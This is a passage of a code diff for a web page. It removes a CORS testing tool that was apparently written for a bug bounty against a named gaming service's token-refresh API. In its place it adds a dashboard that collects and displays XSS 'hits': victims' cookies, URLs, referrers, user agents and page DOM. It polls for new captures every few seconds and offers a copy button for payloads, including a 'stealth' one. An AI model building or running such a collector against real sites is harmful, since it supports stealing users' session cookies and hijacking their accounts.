+            if (!val) return 'N/A';
+            try { return atob(val); } 
+            catch(e) { return val; } // Return raw if not base64
         }
-
-        function statusClass(item) {
-            if (item.ok && (item.authPaths.length || item.piiPaths.length)) {
-                return "status-ok";
-            }
-            if (item.ok) {
-                return "status-warn";
-            }
-            return "status-bad";
-        }
-
-        function renderResults(items) {
-            resultsEl.innerHTML = "";
-
-            for (const item of items) {
-                const piiText = item.piiPaths.length ? item.piiPaths.join("\n") : "None detected";
-                const authText = item.authPaths.length ? item.authPaths.join("\n") : "None detected";
-
-                const card = document.createElement("article");
-                card.className = "result-card";
-                card.innerHTML = `
-                    <div class="result-head">
-                        <div>
-                            <h3 class="result-title">${item.title}</h3>
-                            <div class="small">${item.url}</div>
-                        </div>
-                        <div class="status-pill ${statusClass(item)}">${item.status} ${item.statusText}</div>
+        
+        function renderHits() {
+            const container = document.getElementById('hits-container');
+            const origins = new Set();
+            let cookieCount = 0;
+            
+            if (hits.length === 0) return;
+            
+            container.innerHTML = '';
+            
+            hits.forEach((hit, idx) => {
+                if (hit.domain && hit.domain !== 'N/A') origins.add(hit.domain);
+                if (hit.cookie && hit.cookie !== 'N/A' && hit.cookie.length > 0) cookieCount++;
+                
+                const div = document.createElement('div');
+                div.className = 'hit' + (idx === 0 ? ' new' : '');
+                div.innerHTML = `
+                    <div class="hit-header">
+                        <span class="hit-time">📡 ${new Date(hit.timestamp).toLocaleString()}</span>
+                        <span class="hit-badge ${idx === 0 ? 'alert' : ''}">
+                            ${idx === 0 ? '🔴 NEW' : 'Hit #' + (hits.length - idx)}
+                        </span>
                     </div>
-                    <div class="kv">
-                        <div>
-                            <span>Response facts</span>
-                            <div>${item.contentType || "no content-type"} | ${item.rawLength} bytes | ${item.elapsedMs} ms | auth=${item.requestAuthMode} | creds=${item.credentialsMode} | readable=${item.bodyReadable ? "yes" : "no"}</div>
-                        </div>
-                        <div>
-                            <span>PII-like fields</span>
-                            <pre>${piiText}</pre>
-                        </div>
-                        <div>
-                            <span>Auth-like fields</span>
-                            <pre>${authText}</pre>
-                        </div>
-                        <div>
-                            <span>Preview</span>
-                            <pre>${escapeHtml(item.preview)}</pre>
-                        </div>
+                    <div class="data-row">
+                        <span class="data-label">🌐 Domain</span>
+                        <span class="data-value">${escapeHtml(hit.domain)}</span>
                     </div>
+                    <div class="data-row">
+                        <span class="data-label">🔗 URL</span>
+                        <span class="data-value">${escapeHtml(hit.url)}</span>
+                    </div>
+                    <div class="data-row">
+                        <span class="data-label">🍪 Cookies</span>
+                        <span class="data-value">${escapeHtml(hit.cookie)}</span>
+                    </div>
+                    <div class="data-row">
+                        <span class="data-label">↩️ Referrer</span>
+                        <span class="data-value">${escapeHtml(hit.referrer)}</span>
+                    </div>
+                    <div class="data-row">
+                        <span class="data-label">🖥️ User-Agent</span>
+                        <span class="data-value">${escapeHtml(hit.userAgent)}</span>
+                    </div>
+                    ${hit.dom && hit.dom !== 'N/A' ? `
+                    <div class="data-row">
+                        <span class="data-label">📄 DOM</span>
+                        <span class="data-value">${escapeHtml(hit.dom.substring(0, 500))}...</span>
+                    </div>` : ''}
                 `;
-                resultsEl.appendChild(card);
-            }
-        }
-
-        function escapeHtml(value) {
-            return String(value)
-                .replaceAll("&", "&amp;")
-                .replaceAll("<", "&lt;")
-                .replaceAll(">", "&gt;");
-        }
-
-        async function runTests(tests) {
-            const activeTests = tests.filter((test) => {
-                if (test.needsRefreshToken && !refreshTokenEl.value.trim()) {
-                    return false;
-                }
-                if (test.needsSessionHeaders && (!sessionIdEl.value.trim() || !sessionTokenEl.value.trim())) {
-                    return false;
-                }
-                return true;
+                container.appendChild(div);
             });
-
-            if (!activeTests.length) {
-                summaryEl.innerHTML = `
-                    <div class="summary-card">
-                        <strong>No runnable tests</strong>
-                        <div class="small">Provide the required headers or token inputs for the selected mode. Manual mode requires both <code>Session_id</code> and <code>Sessiontoken</code>. Existing exportable evidence was preserved.</div>
-                    </div>
-                `;
-                resultsEl.innerHTML = '<div class="empty">Nothing ran. Manual mode needs <code>Session_id</code> and <code>Sessiontoken</code>. If you only have a refresh token and want chain evidence, use <code>Run refresh-token chain</code>.</div>';
-                return;
-            }
-
-            clearVisualResults();
-            setBusy(true);
-
-            const items = [];
-            for (const test of activeTests) {
-                items.push(await runFetch(test, {
-                    requestAuthMode: test.needsSessionHeaders ? "manual-session-headers" : "cookies-or-none"
-                }));
-            }
-
-            persistRun(tests === COOKIE_TESTS ? "cookie" : "manual", items);
-            renderSummary(items);
-            renderResults(items);
-            setBusy(false);
+            
+            document.getElementById('hit-count').textContent = hits.length;
+            document.getElementById('cookie-count').textContent = cookieCount;
+            document.getElementById('unique-origins').textContent = origins.size;
         }
-
-        async function runRefreshChain() {
-            const refreshToken = refreshTokenEl.value.trim();
-            if (!refreshToken) {
-                summaryEl.innerHTML = `
-                    <div class="summary-card">
-                        <strong>Refresh token required</strong>
-                        <div class="small">Paste your own long refresh JWT to run the confirmed cross-origin auth chain. Existing exportable evidence was preserved.</div>
-                    </div>
-                `;
-                resultsEl.innerHTML = '<div class="empty">Nothing ran. A valid refresh token is required for the chain.</div>';
-                return;
-            }
-
-            clearVisualResults();
-            setBusy(true);
-
-            const refreshBody = {
-                clientType: "Slotomania.com-ONE",
-                clientVersion: "77.153.02",
-                clientLanguage: "en",
-                refreshToken,
-                timeZone: "UTC-4",
-                platformType: "html5",
-                containerType: "web",
-                marketType: "pras"
-            };
-
-            let refreshResponse;
-            let refreshText = "";
-            let refreshJson = null;
-            const refreshStartedAt = performance.now();
-
-            try {
-                refreshResponse = await fetch(MANUAL_TESTS[0].url, {
-                    method: "POST",
-                    mode: "cors",
-                    cache: "no-store",
-                    credentials: "omit",
-                    headers: new Headers({
-                        "Content-Type": "application/json",
-                        "X-Bug-Bounty": BUG_BOUNTY_HEADER_VALUE
-                    }),
-                    body: JSON.stringify(refreshBody)
-                });
-                refreshText = await refreshResponse.text();
-                try {
-                    refreshJson = refreshText ? JSON.parse(refreshText) : null;
-                } catch (error) {
-                    refreshJson = null;
-                }
-            } catch (error) {
-                const failedRefresh = {
-                    title: "Refresh flow token issuance",
-                    url: MANUAL_TESTS[0].url,
-                    status: "ERR",
-                    statusText: error.message,
-                    elapsedMs: Math.round(performance.now() - refreshStartedAt),
-                    ok: false,
-                    piiPaths: [],
-                    authPaths: [],
-                    contentType: "",
-                    bodyReadable: false,
-                    credentialsMode: "omit",
-                    requestAuthMode: "refresh-jwt",
-                    preview: `Fetch failed: ${error.message}`,
-                    rawLength: 0
-                };
-                persistRun("chain", [failedRefresh]);
-                renderSummary([failedRefresh]);
-                renderResults([failedRefresh]);
-                setBusy(false);
-                return;
-            }
-
-            const refreshSignals = refreshJson ? extractSignals(refreshJson) : { pii: [], auth: [] };
-            const refreshResult = {
-                title: "Refresh flow token issuance",
-                url: MANUAL_TESTS[0].url,
-                status: refreshResponse.status,
-                statusText: refreshResponse.statusText,
-                elapsedMs: Math.round(performance.now() - refreshStartedAt),
-                ok: refreshResponse.ok,
-                piiPaths: [...new Set(refreshSignals.pii)].slice(0, 10),
-                authPaths: [...new Set(refreshSignals.auth)].slice(0, 12),
-                contentType: refreshResponse.headers.get("content-type") || "",
-                bodyReadable: true,
-                credentialsMode: "omit",
-                requestAuthMode: "refresh-jwt",
-                preview: refreshJson ? JSON.stringify(sanitizePayload(refreshJson), null, 2) : refreshText.slice(0, 2000),
-                rawLength: refreshText.length
-            };
-
-            const items = [refreshResult];
-
-            if (!refreshResult.ok) {
-                renderSummary(items);
-                renderResults(items);
-                setBusy(false);
-                return;
-            }
-
-            let sessionToken;
-            let sessionId;
-            let jwtPayload = null;
-
-            sessionToken = refreshJson && refreshJson.sessionToken;
-            if (!sessionToken) {
-                renderSummary(items);
-                renderResults(items);
-                setBusy(false);
-                return;
-            }
-
-            try {
-                jwtPayload = decodeJwtPayload(sessionToken);
-                sessionId = jwtPayload.sessionId;
-            } catch (error) {
-                sessionId = "";
-            }
-
-            const freshHeaders = new Headers();
-            if (sessionId) {
-                freshHeaders.set("Session_id", sessionId);
-            }
-            freshHeaders.set("Sessiontoken", sessionToken);
-
-            for (const test of CHAIN_TESTS) {
-                items.push(await runFetch(test, {
-                    overrideHeaders: freshHeaders,
-                    overrideCredentials: "omit",
-                    requestAuthMode: "fresh-session-headers"
-                }));
-            }
-
-            const chainSummary = [
-                {
-                    title: "Refresh chain",
-                    ok: true,
-                    status: "OK",
-                    statusText: "Fresh session established",
-                    elapsedMs: 0,
-                    contentType: "application/json",
-                    rawLength: 0,
-                    piiPaths: [],
-                    bodyReadable: true,
-                    credentialsMode: "omit",
-                    requestAuthMode: "derived-session-context",
-                    authPaths: [
-                        "$.sessionToken",
-                        "$.refreshToken",
-                        "$.userReferenceId",
-                        sessionId ? "$.decoded.sessionId" : ""
-                    ].filter(Boolean),
-                    url: "Client-side decoded chain context",
-                    preview: JSON.stringify(sanitizePayload({
-                        refreshResponse: refreshJson,
-                        decodedSessionToken: jwtPayload
-                    }), null, 2)
-                }
-            ];
-
-            persistRun("chain", [...chainSummary, ...items]);
-            renderSummary([...chainSummary, ...items]);
-            renderResults([...chainSummary, ...items]);
-            setBusy(false);
+        
+        function escapeHtml(str) {
+            if (!str) return 'N/A';
+            const div = document.createElement('div');
+            div.appendChild(document.createTextNode(str));
+            return div.innerHTML;
         }
-
-        chainBtn.addEventListener("click", runRefreshChain);
-        cookieBtn.addEventListener("click", () => runTests(COOKIE_TESTS));
-        manualBtn.addEventListener("click", () => runTests(MANUAL_TESTS));
-        exportJsonBtn.addEventListener("click", () => {
-            if (!lastRun) {
-                return;
+        
+        function copyPayload(el) {
+            const text = el.textContent.replace('📋 Click to copy', '').replace('📋 Click to copy (stealth)', '').trim();
+            navigator.clipboard.writeText(text).then(() => {
+                const hint = el.querySelector('.copy-hint');
+                hint.textContent = '✅ Copied!';
+                setTimeout(() => { hint.textContent = '📋 Click to copy'; }, 2000);
+            });
+        }
+        
+        // Add clear button
+        if (hits.length > 0) {
+            const clearBtn = document.createElement('button');
+            clearBtn.textContent = '🗑️ Clear All Hits';
+            clearBtn.style.cssText = 'margin-top:20px;padding:8px 16px;background:#ff4444;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:0.85em;';
+            clearBtn.onclick = () => {
+                localStorage.removeItem('xss_hits');
+                location.reload();
+            };
+            document.querySelector('.container').appendChild(clearBtn);
+        }
+        
+        // Auto-refresh every 5 seconds to check for new hits
+        setInterval(() => {
+            const stored = JSON.parse(localStorage.getItem('xss_hits') || '[]');
+            if (stored.length !== hits.length) {
+                hits = stored;
+                renderHits();
             }
-            downloadText(
-                `slotomania-cors-evidence-${Date.now()}.json`,
-                JSON.stringify(lastRun, null, 2),
-                "application/json"
-            );
-        });
-        exportMdBtn.addEventListener("click", () => {
-            if (!lastRun) {
-                return;
-            }
-            downloadText(
-                `slotomania-cors-summary-${Date.now()}.md`,
-                buildMarkdownReport(),
-                "text/markdown"
-            );
-        });
-        clearBtn.addEventListener("click", clearResults);
-        updateExportState();
+        }, 5000);
     </script>
 </body>
-
 </html>
